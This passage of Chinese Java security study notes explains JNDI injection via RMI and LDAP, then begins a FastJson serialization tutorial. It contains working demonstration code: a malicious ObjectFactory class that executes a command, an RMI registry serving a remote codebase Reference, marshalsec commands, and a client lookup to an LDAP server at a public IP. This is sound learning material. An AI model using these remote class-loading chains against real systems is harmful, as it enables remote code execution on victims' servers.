<p><strong>Naming Service</strong></p>
<p>命名服务，将名称与值相关联的实体，称为“绑定”。提供了一种使用“find”或“search”操作来根据名称查找对象的便捷方式，就比如上面学RMI的时候根据<code>Name</code>去获取对应的对象</p>
<p><strong>Directory Service</strong></p>
<p>一种特殊的命名服务，允许存储了搜索“目录对象”</p>
<p>使用JNDI必须要有服务提供方</p>
<p>一些服务接口：</p>
<ul>
<li>LDAP 轻量级目录访问协议</li>
<li>CORBA 公共对象请求代理结构服务</li>
<li>RMI 远程方法调用</li>
<li>DNS 域名服务</li>
</ul>
<blockquote>
<p>在JNDI注入中涉及最多的是LDAP、RMI</p>
</blockquote>
<h4 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h4><blockquote>
<p>工厂模式</p>
<p>会利用到codebase </p>
<p>在java7u21、6u45、8u113 的时候修改默认设置java.rmi.useCodebaseOnly=true</p>
<p>环境：jdk8u112</p>
</blockquote>
<h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p>存储类名，工厂名以及加载工厂的未知，都可以通过对应的get获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ReferenceWrapper"><a href="#ReferenceWrapper" class="headerlink" title="ReferenceWrapper"></a>ReferenceWrapper</h5><p>RMI服务中实现了<code>RemoteReference</code>的类，单纯地获取<code>Reference</code>并返回<code>Reference</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.wrappee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><h6 id="Exploit类（恶意类"><a href="#Exploit类（恶意类" class="headerlink" title="Exploit类（恶意类"></a>Exploit类（恶意类</h6><p>要实现<code>ObjectFactory</code>接口</p>
<p>编译之后放在<code>http://127.0.0.1:8000</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello ameuu&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="服务-Server"><a href="#服务-Server" class="headerlink" title="服务 Server"></a>服务 Server</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 提供服务 注册 将对象与对应的Name进行绑定</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 实现加载该目录下的Exploit</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="受害者-JNDI客户端"><a href="#受害者-JNDI客户端" class="headerlink" title="受害者 JNDI客户端"></a>受害者 JNDI客户端</h6><p>可以通过<code>Properties</code>设置环境变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://127.0.0.1:1099/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        context.lookup(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>所以攻击流程应该是传入恶意的RMI URL给客户端，通过lookup连接到由我们控制的注册中心，获取到恶意的Reference，然后解析Reference获取相应的我们写入的恶意的Factory类从而实现rce</p>
</blockquote>
<h6 id="解析流程"><a href="#解析流程" class="headerlink" title="解析流程"></a>解析流程</h6><p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:160, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">……</span><br><span class="line">lookup:-1, RegistryImpl_Stub</span><br><span class="line">lookup:118, RegistryContext</span><br><span class="line">lookup:128, RegistryContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:15, JNDIClient</span><br></pre></td></tr></table></figure>

<p>在<code>InitialContext</code>中已经将我们设置的变量放到了对应的变量中</p>
<p><img src="https://img-blog.csdnimg.cn/b97ec99e73314415bbd6ff491c6d1999.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>在<code>InitialContext#lookup</code>中会调用到<code>defaultInitCtx#lookup</code>，从而调用了<code>RegistryContext#lookup</code>，之后就是根据我们初始化的内容进入到注册中心通过<code>RegistryImpl_Stub#lookup</code>获取注册中心中<code>Name</code>所对应的对象，也就是<code>referenceWrapper</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123; <span class="comment">// var1 = Exploit</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        RemoteCall var2 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1); <span class="comment">// 进行序列化 因为RMI底层是类序列化的值的传递</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInput var6 = var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject(); <span class="comment">// Remote</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.ref.done(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var23;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var19;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var20;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后通过<code>RegistryContext#decodeObject</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/84fa1cf7b69647b18c30d27682db4285.png" alt="img"></p>
<p>然后在<code>NamingManager#getObjectInstance</code>中根据Reference获取Factory</p>
<p><img src="https://img-blog.csdnimg.cn/904a183a7b1947589f00d36a38f295f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>这里codebase的值就成了我们传进去的带有恶意类的url</p>
<p><img src="https://img-blog.csdnimg.cn/0c74cec9f88d4b4fbcc8321a9e523321.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>之后通过<code>loadClass</code>对类进行加载，运行了Exploit中的静态代码实现RCE</p>
<p><img src="https://img-blog.csdnimg.cn/746812b0c5954c9cae50937006c06e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><blockquote>
<p>使用范围更广</p>
<p>需要：com.sun.jndi.ldap.object.trustURLCodebase 为 true ， JDK 11.0.1 、 8u191 、 7u201 、 6u211 开始默认为 false </p>
</blockquote>
<p>攻击流程：</p>
<blockquote>
<ol>
<li>攻击者为易受攻击的JNDI lookup提供了一个<strong>绝对的</strong>LDAP URL</li>
<li>服务器连接到由攻击者控制的LDAP服务器，该服务器返回恶意JNDI  Reference</li>
<li>服务器解码JNDI Reference</li>
<li>服务器从攻击者控制的服务器获取Factory类</li>
<li>服务器实例化Factory类，实现RCE</li>
</ol>
</blockquote>
<p>用marshalsec开一个服务，将Exploit类编译之后放到vps上，然后用python在对应的目录下开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server --bind 0.0.0.0 8000 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#x27;http://82.156.2.166:8888/#Exploit&#x27; 9000</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.RegistryContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    context.lookup(<span class="string">&quot;ldap://82.156.2.166:9000/Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c108fdc536a74721a697ccf127512c20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="工具运用"><a href="#工具运用" class="headerlink" title="工具运用"></a>工具运用</h4><p>可以利用工具搭建服务端</p>
<h5 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h5><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<p>命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure>

<p>RMI:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/#ExportObject 1099</span><br></pre></td></tr></table></figure>

<p>LDAP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#x27;http://127.0.0.1:8888/#Exploit&#x27; 9000</span><br></pre></td></tr></table></figure>

<p>……</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><blockquote>
<p> FaIth4444师傅的总结</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/723174794616450390c12d3f10f834fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://govuln.com/">代码审计星球</a></p>
<p><a href="https://www.cnblogs.com/cute-puli/p/14373826.html">少走弯路之marshalsec的编译（RMI必备工具） - 铺哩 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.freebuf.com/articles/web/317622.html">https://www.freebuf.com/articles/web/317622.html</a></p>
<p><a href="https://paper.seebug.org/1091/#jndildap">https://paper.seebug.org/1091/#jndildap</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/107942941">https://blog.csdn.net/whatday/article/details/107942941</a></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>CC1</tag>
        <tag>RMI</tag>
        <tag>清明节也没人能阻止我学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅳ</title>
    <url>/2022/04/15/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A3/</url>
    <content><![CDATA[<blockquote>
<p>FastJson入门啦~  持续更新中</p>
</blockquote>
<h2 id="FastJson入门"><a href="#FastJson入门" class="headerlink" title="FastJson入门"></a>FastJson入门</h2><p>Fastjson是Alibaba维护的开源JSON解析库，其优势是”快”。它可以解析 JSON 格式的字符串，⽀持将 Java Bean 序列 化为 JSON 字符串，也可以从JSON字符串反序列化到 Java Bean 。</p>
<p><a href="https://github.com/alibaba/fastjson">alibaba/fastjson</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><code>vsersion: 1.2.24</code></p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><ul>
<li><strong>Json.toJSONString</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Demo&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.Id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;ameuu&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.sex = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">        <span class="keyword">this</span>.score = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getScore&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        Id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setScore&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Demo&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Id=&#x27;&quot;</span> + Id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, sex=&quot;</span> + sex +</span><br><span class="line">                <span class="string">&quot;, score=&quot;</span> + score +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="非自省"><a href="#非自省" class="headerlink" title="非自省"></a>非自省</h4><p><code>JSON.toJSONString()</code>|<code>JSON.toJSON</code>，在序列化的时候会自动调用构造函数以及各种get函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        String res = JSON.toJSONString(demo);</span><br><span class="line">        </span><br><span class="line">        System.out.println(res); <span class="comment">// &#123;&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span></span><br><span class="line">        System.out.println(JSON.toJSON(demo)); <span class="comment">// &#123;&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;id&quot;:&quot;1&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="自省"><a href="#自省" class="headerlink" title="自省"></a>自省</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        System.out.println(JSON.toJSONString(demo, SerializerFeature.WriteClassName));</span><br><span class="line"><span class="comment">//        &#123;&quot;@type&quot;:&quot;FastJson.Demo&quot;,&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>在一开始自己尝试的时候发现：</p>
<p><code>Demo demo = (Demo)JSON.parse(serialize);</code>会报错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object demo = JSON.parse(serialize);</span><br><span class="line">        JSONObject demo1 = JSON.parseObject(serialize);</span><br><span class="line">        System.out.println(demo1); <span class="comment">// 输出出来也只是一串字符串 并没有调用toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以先获取他的<code>Class</code>，我们可以发现一开始并没有真正得获取到我们原本的对象，然后在第三个方法获得我们的对象的时候会自动调用构造函数并且setter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// JSON.parse Class = class com.alibaba.fastjson.JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse Class = &quot;</span>+JSON.parse(serialize).getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// JSON.parseObject Class = class com.alibaba.fastjson.JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject Class = &quot;</span>+JSON.parseObject(serialize).getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// JSON.parseObject(String,Class) Class = class FastJson.Demo</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(String,Class) Class = &quot;</span> +JSON.parseObject(serialize,Demo.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是就比如序列化中存在的自省，如果字符串前面有<code>@type</code>，前面两个方法也是可以直接获得原本的对象的，而第一种在输出的时候会直接调用toString方法，而第二种方法虽然输出的时候还是会输出<code>com.alibaba.fastjson.JSONObject</code>，但是会调用setter和getter</p>
